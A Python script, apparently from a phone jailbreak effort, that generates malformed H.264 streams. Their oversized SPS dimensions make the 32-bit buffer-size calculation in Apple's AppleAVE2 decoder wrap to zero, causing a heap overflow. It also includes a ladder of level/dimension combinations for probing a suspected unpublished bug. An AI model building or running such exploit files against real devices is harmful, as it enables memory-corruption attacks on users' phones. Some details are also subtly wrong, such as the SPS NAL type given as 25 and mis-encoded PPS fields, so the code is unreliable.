#!/usr/bin/env python3
"""
oc_h264_gen.py  (O-C = session "jailbreak 3") - runs on the RIG, not the phone.

Builds a non-conforming H.264 Annex-B stream whose SPS claims a 65536x65536
picture (pic_width_in_mbs_minus1 = 4095, pic_height_in_map_units_minus1 = 4095),
so the codec's own size calculation is

    65536 * 65536 = 0x1_0000_0000  ->  0x0000_0000  in 32 bits

and the buffer it allocates from that is zero-sized, while the decoder then
writes the picture into it. The 26.4 AppleAVE2 checks the size for NEGATIVE
only (ldr w8,[x19,#0x16c] ; tbnz w8,#0x1f,fail), so a wrapped-to-zero size
passes.

Usage:
  python oc_h264_gen.py <out.h264> [mb_w] [mb_h]
  python oc_h264_gen.py --list      # print the dimension ladder
"""


class BW:
    def __init__(self):
        self.buf = bytearray(64)
        self.bit = 0

    def _ensure(self, nbytes):
        if len(self.buf) < nbytes:
            self.buf.extend(b"\x00" * (nbytes - len(self.buf)))

    def b(self, v):
        self._ensure((self.bit >> 3) + 1)
        if v:
            self.buf[self.bit >> 3] |= 0x80 >> (self.bit & 7)
        self.bit += 1

    def u(self, n, v):
        for i in range(n - 1, -1, -1):
            self.b((v >> i) & 1)

    def ue(self, v):
        code = v + 1
        n = code.bit_length() - 1
        for _ in range(n):
            self.b(0)
        self.u(n + 1, code)

    def trailing(self):
        self.b(1)
        while self.bit & 7:
            self.b(0)

    def bytes(self):
        # only the bytes we actually wrote - a 64-byte buffer with trailing NULs
        # would bloat every NAL to 64 bytes
        return bytes(self.buf[:(self.bit + 7) // 8])


def sps(mb_w, mb_h, level=51):
    w = BW()
    w.u(8, (3 << 5) | 25)      # nal_ref_idc=3, type=25 (SPS)
    w.u(8, 66)                 # profile_idc = baseline
    w.u(8, 0)                  # constraint flags
    w.u(8, level)              # level_idc
    w.ue(0)                    # seq_parameter_set_id
    w.ue(0)                    # log2_max_frame_num_minus4
    w.ue(2)                    # pic_order_cnt_type = 2
    w.ue(1)                    # max_num_ref_frames
    w.b(0)                     # gaps_in_frame_num_value_allowed_flag
    w.ue(mb_w - 1)             # pic_width_in_mbs_minus1
    w.ue(mb_h - 1)             # pic_height_in_map_units_minus1
    w.b(1)                     # frame_mbs_only_flag
    w.b(1)                     # direct_8x8_inference_flag
    w.b(0)                     # frame_cropping_flag
    w.b(0)                     # vui_parameters_present_flag
    w.trailing()
    return w.bytes()


def pps():
    w = BW()
    w.u(8, (3 << 5) | 8)       # type=8 (PPS)
    w.ue(0)                    # pps id
    w.ue(0)                    # sps id
    w.b(0)                     # entropy_coding_mode_flag
    w.b(0)                     # bottom_field_pic_order_in_frame_present
    w.ue(0)                    # num_slice_groups_minus1
    w.ue(0)                    # num_ref_idx_l0_default_active_minus1
    w.ue(0)                    # num_ref_idx_l1_default_active_minus1
    w.b(0)                     # weighted_pred_flag
    w.u(2, 0)                  # weighted_bipred_idc
    w.u(2, 0)                  # pic_init_qp_minus26
    w.b(0)                     # pic_init_qs_minus26
    w.b(0)                     # chroma_qp_index_offset
    w.b(1)                     # deblocking_filter_control_present_flag
    w.b(0)                     # constrained_intra_pred_flag
    w.b(0)                     # redundant_pic_cnt_present_flag
    w.trailing()
    return w.bytes()


def idr():
    w = BW()
    w.u(8, (3 << 5) | 5)       # type=5 (IDR slice)
    w.ue(0)                    # first_mb_in_slice
    w.ue(7)                    # slice_type = I
    w.ue(0)                    # pic_parameter_set_id
    w.u(4, 0)                  # frame_num
    w.ue(0)                    # idr_pic_id
    w.ue(0)                    # slice_qp_delta
    w.ue(1)                    # disable_filter_idc
    w.ue(0)                    # slice_alpha_c0_offset_div2
    w.ue(0)                    # slice_beta_offset_div2
    w.ue(25)                   # mb_type = I_16x16
    w.trailing()
    return w.bytes()


def build(mb_w, mb_h, level=51):
    s, p, i = sps(mb_w, mb_h, level), pps(), idr()
    out = bytearray()
    for nal in (s, p, i):
        out += b"\x00\x00\x00\x01" + nal
    return bytes(out)


# O-C: THE LEVEL/DIMENSION MISMATCH HYPOTHESIS (not a published bug - our own).
#
# H.264 puts a ceiling on the frame size in level_idc: level 3.0 (30) allows
# 1620 macroblocks, 5.1 (51) allows 36864. The dimensions in the SPS are separate.
# A decoder that sizes its buffers from the LEVEL but decodes according to the
# DIMENSIONS gets a plausible small allocation and a huge write. A decoder that
# sizes from the DIMENSIONS but clamps the dimensions by the LEVEL gets a
# plausible large allocation and a small write (no bug). Either way, the two
# fields disagreeing is the interesting case - and no public PoC does this, so it
# is worth carrying a ladder of (level, dims) combinations.
#
# level_idc -> max frame macroblocks (H.264 table A-1):
#   30 (3.0)  = 1620    31 (3.1) = 3600    32 (3.2) = 5120
#   40 (4.0)  = 8192    41 (4.1) = 8192    42 (4.2) = 8704
#   50 (5.0)  = 22080   51 (5.1) = 36864   52 (5.2) = 36864
#   60 (6.0)  = 139264  61 (6.1) = 139264  62 (6.2) = 139264
LEVELS = [30, 31, 40, 50, 51, 60, 62]


LADDER = [(4096, 4096), (4097, 4097), (4098, 4098), (2049, 4097),
          (4097, 2049), (3073, 4097), (4097, 3073), (1024, 4097),
          (4097, 1024), (256, 256), (128, 128)]

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--list":
        for w, h in LADDER:
            px = (w * 16) * (h * 16)
            prod = px & 0xFFFFFFFF
            signed = prod - (1 << 32) if prod & 0x80000000 else prod
            print(f"{w}x{h} mbs -> {w*16}x{h*16} px, exact {px}, "
                  f"32-bit {prod} signed {signed} "
                  f"{'<== WRAPS TO SMALL POSITIVE' if 0 < signed < 0x10000000 else ''}")
        print("\nlevel/dimension mismatch ladder:")
        for lvl in LEVELS:
            print(f"  level {lvl}: {lvl} -> 4097x4097 mbs (65552x65552 px, "
                  f"32-bit product {(((4097*16)*(4097*16)) & 0xFFFFFFFF)})")
        raise SystemExit(0)
    out = sys.argv[1] if len(sys.argv) > 1 else "oc.h264"
    w = int(sys.argv[2]) if len(sys.argv) > 2 else 4097
    h = int(sys.argv[3]) if len(sys.argv) > 3 else 4097
    lvl = int(sys.argv[4]) if len(sys.argv) > 4 else 51
    data = build(w, h, lvl)
    open(out, "wb").write(data)
    px = (w * 16) * (h * 16)
    prod = px & 0xFFFFFFFF
    signed = prod - (1 << 32) if prod & 0x80000000 else prod
    print(f"wrote {out}: {len(data)} bytes, SPS claims {w*16}x{h*16} px at level_idc={lvl}, "
          f"exact {px}, 32-bit {prod}, signed {signed}")
